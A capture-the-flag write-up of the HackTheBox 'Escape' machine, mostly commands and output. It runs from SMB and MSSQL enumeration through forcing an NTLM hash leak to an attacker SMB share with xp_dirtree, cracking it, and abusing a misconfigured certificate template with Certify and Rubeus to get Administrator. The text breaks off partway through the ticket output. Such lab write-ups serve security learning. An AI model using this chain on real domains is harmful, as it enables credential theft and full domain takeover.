### Escape HackTheBox

### Difficulty = Medium

### IP Address = 10.129.157.76

Nmap Scan:

```
─$ nmap -sCV -A 10.129.157.76 -p53,88,135,139,389,445,464,593,636,1433,3269,5985,9389 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-26 18:04 WAT
Nmap scan report for 10.129.157.76
Host is up (0.27s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-27 01:04:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T01:06:33+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T01:06:28+00:00; +7h59m56s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: sequel
|   NetBIOS_Domain_Name: sequel
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sequel.htb
|   DNS_Computer_Name: dc.sequel.htb
|   DNS_Tree_Name: sequel.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-26T23:07:12
|_Not valid after:  2053-02-26T23:07:12
|_ssl-date: 2023-02-27T01:06:33+00:00; +7h59m59s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T01:06:31+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.129.157.76:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2023-02-27T01:05:45
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 1s, median: 7h59m57s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.62 seconds
```

I'll add the domain name to my `/etc/hosts` file

```
└─$ cat /etc/hosts | grep sequel                     
10.129.157.76   sequel.htb dc.sequel.htb
```

From the scan we know that this is a windows box and its running an active directory environment

I'll start with ldap but i wasn't able to get anything from using nmap scripting engine for ldap

```
└─$ nmap --script "*ldap*" -p389,636 10.129.157.76 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-26 18:11 WAT
Nmap scan report for sequel.htb (10.129.157.76)
Host is up (0.28s latency).

PORT    STATE SERVICE
389/tcp open  ldap
|_ldap-brute: ERROR: Script execution failed (use -d to debug)
636/tcp open  ldapssl

Nmap done: 1 IP address (1 host up) scanned in 90.07 seconds
```

Now lets move on to smb

#### SMB Enumeration

I'll check if we can list our shares anonymously

```
└─$ smbclient -L 10.129.157.76
Password for [WORKGROUP\mark]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.157.76 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Ok cool we can now i'll connect to each share

```
└─$ smbclient //10.129.157.76/NETLOGON
Password for [WORKGROUP\mark]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> q
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Escape]
└─$ smbclient //10.129.157.76/Public  
Password for [WORKGROUP\mark]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

                5184255 blocks of size 4096. 1315642 blocks available
smb: \> mget *
Get file SQL Server Procedures.pdf? y
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (45.7 KiloBytes/sec) (average 45.7 KiloBytes/sec)
smb: \> q
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Escape]
└─$ smbclient //10.129.157.76/SYSVOL
Password for [WORKGROUP\mark]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> q
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Escape]
└─$ 
```

Since we're given a sql procedure pdf file lets check it out

I'll check our the metadata of the file first 

```
└─$ exiftool SQL\ Server\ Procedures.pdf 
ExifTool Version Number         : 12.44
File Name                       : SQL Server Procedures.pdf
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2023:02:26 18:18:02+01:00
File Access Date/Time           : 2023:02:26 18:18:01+01:00
File Inode Change Date/Time     : 2023:02:26 18:18:02+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 2
Creator                         : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/0.15.6 Chrome/100.0.4896.160 Electron/18.3.5 Safari/537.36
Producer                        : Skia/PDF m100
Create Date                     : 2022:11:18 13:39:43+00:00
Modify Date                     : 2022:11:18 13:39:43+00:00
```

Now lets read it 
![image](https://user-images.githubusercontent.com/113513376/221426011-72006f6c-bbeb-499c-a691-6222d84f074e.png)
![image](https://user-images.githubusercontent.com/113513376/221426019-8cb35945-daad-4ce3-a621-a383c5ba0cc3.png)

With that we know that we looted cred and users from it

```
ryan
Ryan
tom
Tom
brandon.brown


* Cred *
PublicUser:GuestUserCantWrite1
```

We know that we can access the mssql server running on the host using the cred `PublicUser:GuestUserCantWrite1`

#### Enumerating MSSQL 

We can connect to it using `impacket-mssqlclient`

But while i tried using impacket-mssqlclient i had some library issues and coudln't fix it 

So i decided to use `sqsh`

```
└─$ sqsh -S sequel.htb -U PublicUser -P GuestUserCantWrite1
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> 
```

Now that i'm connected i'll try to see if i can access external shares which will lead to ntlm hash theft 🤓

First i'll set up an smbserver then run the command

```
xp_dirtree '\\10.10.15.124\share'  
```

Here's the command 
![image](https://user-images.githubusercontent.com/113513376/221429699-f0bbc811-584b-4060-a44b-cfb23f300455.png)

We now have the hash for user sql_svc 

Here's the resource that helped me do this [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

I'll save it in a file and brute force using JTR

```
└─$ john -w=/home/mark/Documents/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:34 DONE (2023-02-26 19:35) 0.02863g/s 306437p/s 306437c/s 306437C/s REINLY..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Lets login to winrm using the cred `sql_svc:REGGIE1234ronnie`

```
└─$ evil-winrm -u sql_svc -p REGGIE1234ronnie -i sequel.htb

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

Checking the sqldirectory there's a log file in it

```
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows

*Evil-WinRM* PS C:\> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Brandon.Brown            Guest
James.Roberts            krbtgt                   Nicole.Thompson
Ryan.Cooper              sql_svc                  Tom.Henn
The command completed with one or more errors.

*Evil-WinRM* PS C:\> cd SQLServer
*Evil-WinRM* PS C:\SQLServer> dir


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe


*Evil-WinRM* PS C:\SQLServer> cd Logs
*Evil-WinRM* PS C:\SQLServer\Logs> dir


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLServer\Logs> 
```

And the size is much so i'll just read the content and filter out `failed` P.S `I already had to download it and analyze it well` 

```
*Evil-WinRM* PS C:\SQLServer\Logs> Select-String ./ERRORLOG.BAK -Pattern 'failed'

ERRORLOG.BAK:36:2022-11-18 13:43:06.06 Server      Perfmon counters for resource governor pools and groups failed to initialize and are disabled.
ERRORLOG.BAK:112:2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
ERRORLOG.BAK:114:2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]


*Evil-WinRM* PS C:\SQLServer\Logs> 
```

Cool we see another cred `Ryan.Cooper:NuclearMosquito3`

#### Privilege Escalation

I'll try it over winrm 

```
└─$ evil-winrm -u Ryan.Cooper -p NuclearMosquito3 -i sequel.htb

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

I upload winPEAS.exe to the target and run it

After running it I got this which i found suspicious

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files
                                                                                                        
  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            :
  ValidDate          : 11/18/2022 1:05:34 PM
  ExpiryDate         : 11/18/2023 1:05:34 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : B3954D2D39DCEF1A673D6AEB9DE9116891CE57B2

  Template           : Template=Kerberos Authentication(1.3.6.1.4.1.311.21.8.15399414.11998038.16730805.7332313.6448437.247.1.33), Major Version Number=110, Minor Version Number=0
  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
       Smart Card Logon
       KDC Authentication
   =================================================================================================

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            : CN=sequel-DC-CA, DC=sequel, DC=htb
  ValidDate          : 11/18/2022 12:58:46 PM
  ExpiryDate         : 11/18/2121 1:08:46 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : A263EA89CAFE503BB33513E359747FD262F91A56

   =================================================================================================

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            : CN=dc.sequel.htb
  ValidDate          : 11/18/2022 1:20:35 PM
  ExpiryDate         : 11/18/2023 1:20:35 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : 742AB4522191331767395039DB9B3B2E27B6F7FA

  Template           : DomainController
  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
   =================================================================================================
```

We see that it uses certificate for client authentication

Searching google i found that you can attempt to perform an active directory certificate abuse

Here's the link [Resouce](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)

First i'll need to upload `certify.exe` here's the compiled binary [binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe)

Now i'll search for vulnerable certificate templates

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload /home/mark/Desktop/B2B/HTB/Escape/Certify.exe
Info: Uploading /home/mark/Desktop/B2B/HTB/Escape/Certify.exe to C:\Users\Ryan.Cooper\Documents\Certify.exe

                                                             
Data: 232104 bytes of 232104 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> ./Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.0932396
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

Now i'll request a new certificate on behalf of a domain administator using Certify by specifying the following parameters:

```
/ca - specifies the Certificate Authority server we're sending the request to;
/template - specifies the certificate template that should be used for generating the new certificate;
/altname - specifies the AD user for which the new certificate should be generated.
```

Here's it

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3kd/kToJV25MKP5akMWXHf9wtu3TkxELWzYlOEkGSQbCl+OW
jdSazKlT/BVXvULO9LYQKC8baEodIQ/WHZWW9yucmb232+1md6Iw9M7uNZNFUqJJ
h95s+uEwd5cNHAIFc/rG7l30neev6MusAtz/wVSRK3u1UzRSELHHPFfxNcj3wiLf
QHMosbUGJiMTVkMzHnbCrdRLa+tFNNyYzCjPuYo07XLVURUfKBJ7rBwlokLQkhOP
+ghuWrnWbeSb1/him7JfCqBrn69BVGW6gmH8f7N2jcEQLUJgw/oOQ3bBSNJzfRSv
R7q3X9sSdLPyhzFK5jF4ODxA2IcSPDq10FYAhQIDAQABAoIBAQCaofLE/TLyd/DT
s98dR9hRLhsjp1/At+LGmWxbM7IDq4hEUjeyg20NY97hR5e6OnfvFZk3202dx7Fs
BrBV9HMJkHVpHuqBPS5Dm7mjFTHyY3meevfcZYg7H92v1I1yJpXUkWlC+mnqT/u4
X7hSZZwmysYTEgSa1ZMhugt4l1VerBx+4piAJ+T6xyEd+ESHY5S/rln4nU5aniL1
qixzrnuQ1u8xotZIm1QAQhTwo57VKZRPHfBlAN9Kl5+mfeoLB571C7xIdNDbZeRk
1hTfpmBFRLydxMbAY97r0UJE08l2Q+Os+6Ap/16ZkEDK5+7po2vlUbiDV9Pe3RR3
F0MCJNEhAoGBAOrM7jYjHZYp8+bBpW28oUR63f/Sde1nLbmYkOQgs1Q7TgMN+rlf
Q2gxaM6cVceZH/GTqiFNeohe8tF/uZLuD3zULrT34TC5J63zRF6jOh/o1Bg1AyLY
XYpt6+/XhEtm/O4fHcCM73VaGMs11Ue+hyFlK+NwSqho5sugKKTU7qj/AoGBAPJZ
KH2dzb/5eBsBtB758NVrp1nW4XM4pJVWPILGh3/mKpX/K+FN8P+IzIE/ypfA8nvZ
4Q61Qv4Kj+8+lsAXw47Jp8XPc07BBz1ujCte4/Fd7jn9/s+zQaVreyabnkopz6Ai
cwSefzRoDPehGyoUKZHN8EGa+gt74kouCkiKVzJ7AoGAQjORnnX8K5Cckh1bNTuQ
BKzX1v9R/KOwwrl/cLK/nSozbq0MWiO/76qusEJn9ST5WrWVrFoaCEUtFWB7xC+W
8k0o9iFFvuUViPgj+MLw6npNAp4/yh1TEmq3sSIEzPW2rrTbQKT8BwxmHTWKcvYH
R6Us4K2SfzVEjXkUvJTEzaUCgYBC4UQBVpk/T3NL0K6KleNWonzumBRjndAdvky4
sl0WeMhr2J2dccr+WhxF1vrr4j2I3Fn1myQ/w15xYc5seKJpN1Frj5J8u1xqIaXh
GjDBnXBu5J97ZjbJld3Ii82lHeDEin0/WxYzujtJ41YByMqoCDMzh7dVj/ylCAui
dTsXHQKBgQDZgfY82inlTI5/ruHn3o7ciAJ4HBzKzzI7qT3x88pbvQlChEPkn3Ge
AmK75vWtb1CABKilrRMCx8Z9bEyoOwQ5BpdOk+55/zVGtYnUl5bGIdtgTJ+Epd14
iG/PwkXVVUT9CDaeTOZrQADjp6bjehWkP1+SdMgjG8q8xplqn2mwGA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAp/DfRS5658ZgAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwMjI3MDUwMzEzWhcNMjUwMjI3
MDUxMzEzWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDeR3+ROglXbkwo/lqQxZcd/3C2
7dOTEQtbNiU4SQZJBsKX45aN1JrMqVP8FVe9Qs70thAoLxtoSh0hD9YdlZb3K5yZ
vbfb7WZ3ojD0zu41k0VSokmH3mz64TB3lw0cAgVz+sbuXfSd56/oy6wC3P/BVJEr
e7VTNFIQscc8V/E1yPfCIt9AcyixtQYmIxNWQzMedsKt1Etr60U03JjMKM+5ijTt
ctVRFR8oEnusHCWiQtCSE4/6CG5audZt5JvX+GKbsl8KoGufr0FUZbqCYfx/s3aN
wRAtQmDD+g5DdsFI0nN9FK9Hurdf2xJ0s/KHMUrmMXg4PEDYhxI8OrXQVgCFAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFGveDAxPuO89VWO5T+Pv2hDfC2h8
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAPql3p0t8YxOk811dFrDNJdgY80Rv+Cb6yJoTzw2yffHUXCEVE7gGFHnh
A4SH4iyQHCnlEoQ/VH02ABiuX8mOmBO3mSe/7nnL3mu+3qCnciCcOwjqdeFBEMfB
MWnULVUFHlkKPXaMG6bcRCUwoToGaTFlq9YDWiypG4l/OraN3u/GsH0ABJBwEx0i
Rk3KC74MmfzaWRA1Nol/GS0QDrSzIgDrqC2Km4/0g74tJ+qfzBFc6R5XcNeNRsfK
ga1xJxWS8G5CQqlx3P5UPqLLZ3Z0DfaCGeKoa6uhLrBIME/6/toWivLJyfKs3heV
4luae7snZPwL+UV8Ml1HyyuRJKHBtw==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:13.8002863
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

As the blog says, we will need to convert the cert.pem file to a pfx file

I saved the cert file in my linux then used openssl to do that, it asks for password to use and i used `lol`

```
└─$ nano cert.pem
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Escape]
└─$ file cert.pem 
cert.pem: PEM RSA private key

┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Escape]
└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Escape]
└─$ ls    
 Certify.exe   cert.pem   cert.pfx   cred   nmapscan  'SQL Server Procedures.pdf'
```

Cool so i'll upload the cert.pfx and rubeus binary back to the target 

Here's the compiled rubeus binary [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload /home/mark/Desktop/B2B/HTB/Escape/cert.pfx
Info: Uploading /home/mark/Desktop/B2B/HTB/Escape/cert.pfx to C:\Users\Ryan.Cooper\Documents\cert.pfx
                                                         
Data: 4564 bytes of 4564 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload /home/mark/Desktop/Tools/AD/Rubeus.exe
Info: Uploading /home/mark/Desktop/Tools/AD/Rubeus.exe to C:\Users\Ryan.Cooper\Documents\Rubeus.exe
                                                             
Data: 286036 bytes of 286036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

So now i'll request ticket granting ticket (TGT) with the certificate using rubeus

```
PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::452e:63e3:bd46:a3bc%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBK7hkd+c72tJ
      idYxREnh++qWquDOKZI9OkusUrU9yCZFKiwzINcU0W68QmdPkjK6dWKCiRO5ds15E+invm7DCgikx7P8
